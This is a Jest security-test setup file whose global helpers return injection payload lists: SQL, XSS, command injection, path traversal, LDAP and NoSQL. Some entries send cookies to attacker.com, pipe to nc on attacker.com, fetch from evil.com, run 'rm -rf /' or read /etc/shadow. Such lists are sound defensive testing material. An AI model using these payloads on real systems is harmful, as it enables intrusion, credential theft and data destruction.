/**
 * Security Test Setup
 * Global setup for security tests
 */

// Set test environment
process.env.NODE_ENV = 'test';

// Increase test timeout for security tests
jest.setTimeout(30000);

// Global test utilities
global.securityTestUtils = {
  /**
   * Generate malicious SQL injection payloads
   */
  getSQLInjectionPayloads: () => [
    "1' OR '1'='1",
    "1' OR 1=1--",
    "admin'--",
    "' OR 'x'='x",
    "1; DROP TABLE users--",
    "' UNION SELECT * FROM passwords--",
    "1' AND '1'='1",
    "' OR '1'='1' /*",
    "admin' OR '1'='1",
    "1' WAITFOR DELAY '00:00:05'--",
  ],

  /**
   * Generate XSS attack payloads
   */
  getXSSPayloads: () => [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<body onload=alert("XSS")>',
    '<input onfocus=alert("XSS") autofocus>',
    '<script>fetch("http://attacker.com?cookie="+document.cookie)</script>',
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    '<img src=x:alert(alt) onerror=eval(src) alt=xss>',
  ],

  /**
   * Generate command injection payloads
   */
  getCommandInjectionPayloads: () => [
    'test; rm -rf /',
    'test && cat /etc/passwd',
    'test | nc attacker.com 4444',
    'test `whoami`',
    'test $(cat /etc/shadow)',
    'test & curl http://evil.com',
    'test\nwhoami',
    '; ls -la',
    '| cat /etc/hosts',
  ],

  /**
   * Generate path traversal payloads
   */
  getPathTraversalPayloads: () => [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..;/..;/..;/etc/passwd',
    '..//..//..//etc/passwd',
    '....\\\\....\\\\....\\\\windows\\\\system32',
  ],

  /**
   * Generate LDAP injection payloads
   */
  getLDAPInjectionPayloads: () => [
    '*',
    '(uid=*)',
    '(&(uid=admin)(userPassword=*))',
    '(|(uid=admin)(uid=*))',
    'admin)(&(password=*))',
  ],

  /**
   * Generate NoSQL injection payloads
   */
  getNoSQLInjectionPayloads: () => [
    { $ne: null },
    { $gt: '' },
    { $regex: '.*' },
    { $where: 'this.username == "admin"' },
  ],

  /**
   * Wait for async operations
   */
  sleep: (ms: number) => new Promise(resolve => setTimeout(resolve, ms)),

  /**
   * Generate random test data
   */
  randomString: (length: number = 10) => {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
  },

  /**
   * Generate test user credentials
   */
  getTestCredentials: () => ({
    username: `testuser_${Date.now()}`,
    password: 'Test@Pass123!',
    email: `test_${Date.now()}@example.com`,
  }),
};

// Mock console methods to reduce noise in tests
global.console = {
  ...console,
  log: jest.fn(),
  debug: jest.fn(),
  info: jest.fn(),
  // Keep warn and error for important messages
  warn: console.warn,
  error: console.error,
};

// Setup and teardown
beforeAll(() => {
  console.info('🔒 Starting Security Test Suite');
});

afterAll(() => {
  console.info('✅ Security Test Suite Complete');
});

// Export types
declare global {
  namespace NodeJS {
    interface Global {
      securityTestUtils: {
        getSQLInjectionPayloads: () => string[];
        getXSSPayloads: () => string[];
        getCommandInjectionPayloads: () => string[];
        getPathTraversalPayloads: () => string[];
        getLDAPInjectionPayloads: () => string[];
        getNoSQLInjectionPayloads: () => any[];
        sleep: (ms: number) => Promise<void>;
        randomString: (length?: number) => string;
        getTestCredentials: () => { username: string; password: string; email: string };
      };
    }
  }
}

export {};
